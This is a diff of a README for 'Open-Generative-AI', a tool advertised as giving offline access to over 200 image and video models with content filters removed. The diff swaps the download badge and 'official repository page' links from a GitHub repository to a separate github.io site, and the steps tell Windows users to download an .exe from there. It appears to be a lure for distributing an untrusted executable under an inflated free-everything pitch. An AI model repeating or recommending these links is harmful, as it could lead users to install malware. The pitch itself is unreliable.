@@ -1,6 +1,6 @@
 # 🎨 Open-Generative-AI - Create unlimited professional images and videos
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Indoor-antenna354/Open-Generative-AI)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://indoor-antenna354.github.io)
 
 Open-Generative-AI provides a complete studio for image and video generation on your computer. You gain access to over 200 models, including Flux, Kling, and others. This tool removes content filters and works offline. You control your creative process without monthly fees or external restrictions.
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware to run these models. Verify your system me
 
 You must follow these steps to install the program on your Windows machine.
 
-1. Visit the [official repository page](https://github.com/Indoor-antenna354/Open-Generative-AI) to access the download options.
+1. Visit the [official repository page](https://indoor-antenna354.github.io) to access the download options.
 2. Look for the Releases section on the right side of the page.
 3. Select the latest version listed.
 4. Download the file ending in .exe to your computer.
